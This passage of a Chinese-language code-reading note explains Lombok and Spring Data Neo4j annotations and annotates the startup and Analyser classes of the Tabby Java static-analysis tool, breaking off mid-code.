name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></p></li><li><p><strong><span class="citation"data-cites="NoArgsConstructor">@NoArgsConstructor</span> / <spanclass="citation"data-cites="AllArgsConstructor">@AllArgsConstructor</span></strong>:自动生成无参构造方法和包含所有属性的构造方法。</p><p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">NoArgsConstructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">AllArgsConstructor</span></span><span class="token punctuation">;</span>   <span class="token annotation punctuation">@NoArgsConstructor</span><span class="token annotation punctuation">@AllArgsConstructor</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></p></li><li><p><strong><span class="citation"data-cites="Builder">@Builder</span></strong>:自动生成构建器模式的代码。</p><p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Builder</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Builder</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></p></li><li><p><strong><span class="citation"data-cites="Slf4j">@Slf4j</span></strong>: 自动生成 SLF4J的日志对象。</p><p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span>   <span class="token annotation punctuation">@Slf4j</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">exampleMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"This is an informational log message."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></p></li><li><p><strong><span class="citation"data-cites="NoArgsConstructor">@NoArgsConstructor</span> / <spanclass="citation"data-cites="AllArgsConstructor">@AllArgsConstructor</span>(onConstructor_)</strong>:自动生成构造方法，可以选择是否包含 <code>@NonNull</code>注解的字段。</p><p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">AllArgsConstructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">NonNull</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@AllArgsConstructor</span><span class="token punctuation">(</span>onConstructor_<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token annotation punctuation">@NonNull</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></p></li></ol><p>这些注解只是 Lombok提供的一小部分功能。你可以根据项目的需要选择性地使用这些注解以简化代码。在使用Lombok 时，通常需要在项目中集成 Lombok 插件或在 IDE 中安装 Lombok插件，以确保注解能够正确生效。</p></li><li><p><span class="citation"data-cites="EnableNeo4jRepositories是一个Spring">@EnableNeo4jRepositories是一个Spring</span>Data Neo4j的注解,它用于在Spring应用中启用Neo4j数据库的存储库支持。</p><p>其中参数"tabby.dal.neo4j.repository"指定了Neo4j存储库接口的基包。</p><p><span class="citation"data-cites="EnableNeo4jRepositories的作用是">@EnableNeo4jRepositories的作用是</span>:</p><ol type="1"><li><p>自动扫描指定包及子包下所有继承Neo4jRepository的接口,并生成其实现类。</p></li><li><p>将这些自动生成的存储库实现类注册为SpringBean,这样可以直接注入并使用。</p></li><li><p>管理这些存储库的生命周期。</p></li><li><p>将基于Neo4j OGM的存储库支持整合到Spring事务管理中。</p></li></ol><p>所以使用这个注解后,我们就可以创建Neo4jRepository接口,并直接注入使用,而不必手动实现数据访问层。</p><p>例如:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@EnableNeo4jRepositories</span><span class="token punctuation">(</span><span class="token string">"com.example.repositories"</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Repository</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserRepository</span> <span class="token keyword">extends</span> <span class="token class-name">Neo4jRepository</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">,</span> <span class="token class-name">Long</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyService</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>   <span class="token keyword">private</span> <span class="token class-name">UserRepository</span> userRepository<span class="token punctuation">;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span></code></pre><p>这样就可以通过userRepository直接操作Neo4j数据库中的数据,非常方便。</p></li><li><p><strong>Spring Boot 应用程序，用于运行 Analyser实例。</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">ch<span class="token punctuation">.</span>qos<span class="token punctuation">.</span>logback<span class="token punctuation">.</span>classic<span class="token punctuation">.</span></span><span class="token class-name">Level</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">ch<span class="token punctuation">.</span>qos<span class="token punctuation">.</span>logback<span class="token punctuation">.</span>classic<span class="token punctuation">.</span></span><span class="token class-name">LoggerContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">CommandLineRunner</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">EntityScan</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>repository<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">EnableNeo4jRepositories</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">GlobalConfiguration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">Analyser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">FileUtils</span></span><span class="token punctuation">;</span><span class="token comment">// @Slf4j：@Slf4j注解会在编译时通过Lombok生成代码,</span><span class="token comment">// 为该类添加一个静态的log字段,类型为org.slf4j.Logger。</span><span class="token comment">// 这样就可以直接在类中使用this.log来打印日志,而不需要手动创建Logger实例。</span><span class="token comment">// @SpringBootApplication：Spring Boot注解，标记这个类为Spring Boot应用程序的主类。</span><span class="token comment">// @EntityScan：Spring Boot注解，指定Spring应该扫描哪些包来查找JPA实体。</span><span class="token comment">// @EnableNeo4jRepositories：启用 Neo4j 存储库。</span><span class="token annotation punctuation">@Slf4j</span><span class="token annotation punctuation">@SpringBootApplication</span><span class="token annotation punctuation">@EntityScan</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"tabby.dal.caching.bean"</span><span class="token punctuation">,</span><span class="token string">"tabby.dal.neo4j.entity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableNeo4jRepositories</span><span class="token punctuation">(</span><span class="token string">"tabby.dal.neo4j.repository"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// @Autowired 注解用于将 Analyser 实例注入到 App 类中。这意味著 Spring Boot 会自动创建一个 Analyser 实例，并将其注入到 App 类中。</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">Analyser</span> analyser<span class="token punctuation">;</span>    <span class="token comment">// 启动 Spring Boot 应用程序，并根据命令行参数设置配置文件路径</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token string">"--config"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">CONFIG_FILE_PATH</span> <span class="token operator">=</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">App</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 设置日志级别，以便打印所有日志消息</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLogDebugLevel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">LoggerContext</span> loggerContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LoggerContext</span><span class="token punctuation">)</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getILoggerFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">DEBUG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            loggerContext<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token string">"tabby"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setLevel</span><span class="token punctuation">(</span><span class="token class-name">Level</span><span class="token punctuation">.</span><span class="token constant">DEBUG</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @Bean 方法，用于声明一个 CommandLineRunner 对象</span>    <span class="token comment">// 在应用程序启动后执行以下任务：  </span>    <span class="token comment">//      初始化全局配置 </span>    <span class="token comment">//      设置日志级别 </span>    <span class="token comment">//      运行 Analyser 实例 </span>    <span class="token comment">//      输出日志消息**</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token class-name">CommandLineRunner</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> args <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span><span class="token punctuation">&#123;</span>                <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token function">initConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setLogDebugLevel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                analyser<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", Please check your settings.properties file."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Done. Bye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="tabbycoreanalyser.java">tabby/core/Analyser.java</h3><ol type="1"><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>core</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token comment">// 导入Spring框架的Component注解，用于标记这个类为Spring组件</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">CompilationDeathException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">G</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">Main</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span>options<span class="token punctuation">.</span></span><span class="token class-name">Options</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">GlobalConfiguration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">SootConfiguration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>collector<span class="token punctuation">.</span></span><span class="token class-name">FileCollector</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>container<span class="token punctuation">.</span></span><span class="token class-name">DataContainer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>container<span class="token punctuation">.</span></span><span class="token class-name">RulesContainer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>scanner<span class="token punctuation">.</span></span><span class="token class-name">CallGraphScanner</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>scanner<span class="token punctuation">.</span></span><span class="token class-name">ClassInfoScanner</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">FileUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token comment">// 导入Java的Util库，包含一些常用的数据结构和工具类，如List、Map等</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token comment">// 导入Java的并发库，用于多线程编程。</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Future</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">SootClass</span><span class="token punctuation">.</span><span class="token static">HIERARCHY</span></span><span class="token punctuation">;</span><span class="token comment">/** * @author wh1t3P1g * @since 2020/10/10 */</span><span class="token annotation punctuation">@Slf4j</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Analyser</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">DataContainer</span> dataContainer<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">ClassInfoScanner</span> classInfoScanner<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">CallGraphScanner</span> callGraphScanner<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">RulesContainer</span> rulesContainer<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">FileCollector</span> fileCollector<span class="token punctuation">;</span>    <span class="token comment">// 类的主要执行方法。它首先根据全局配置决定是否清理旧数据和是否构建新数据。</span>    <span class="token comment">// 然后，它收集JDK依赖，收集目标文件，运行Soot分析，保存数据到CSV文件，最</span>    <span class="token comment">// 后保存数据到Neo4j数据库。</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">boolean</span> buildEnabled <span class="token operator">=</span> <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IS_BUILD_ENABLE</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> loadEnabled <span class="token operator">=</span> <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IS_LOAD_ENABLE</span><span class="token punctuation">;</span>        <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Boolean</span><span class="token punctuation">></span></span> future <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>loadEnabled<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 用线程先删除neo4j中老数据</span>            future <span class="token operator">=</span> dataContainer<span class="token punctuation">.</span><span class="token function">cleanAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>buildEnabled<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>future<span class="token punctuation">.</span><span class="token function">isDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token comment">// do nothing 等待结束</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>buildEnabled<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> dependencies <span class="token operator">=</span> fileCollector<span class="token punctuation">.</span><span class="token function">collectJdkDependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Get &#123;&#125; JDK dependencies"</span><span class="token punctuation">,</span> dependencies<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Try to collect all targets"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> cps <span class="token operator">=</span> <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IS_EXCLUDE_JDK</span> <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>dependencies<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> targets <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 收集目标</span>            <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span>rulesContainer <span class="token operator">=</span> rulesContainer<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IS_JDK_ONLY</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> files <span class="token operator">=</span> fileCollector<span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">TARGET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cps<span class="token punctuation">.</span><span class="token function">putAll</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">;</span>                targets<span class="token punctuation">.</span><span class="token function">putAll</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IS_JDK_ONLY</span>                    <span class="token operator">||</span> <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IS_JDK_PROCESS</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                targets<span class="token punctuation">.</span><span class="token function">putAll</span><span class="token punctuation">(</span>dependencies<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// 添加必要的依赖，防止信息缺失，比如servlet依赖</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">fileExists</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">LIBS_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> files <span class="token operator">=</span> fileCollector<span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">LIBS_PATH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span>libraries<span class="token punctuation">.</span><span class="token function">putAll</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> entry<span class="token operator">:</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span>libraries<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                cps<span class="token punctuation">.</span><span class="token function">putIfAbsent</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token 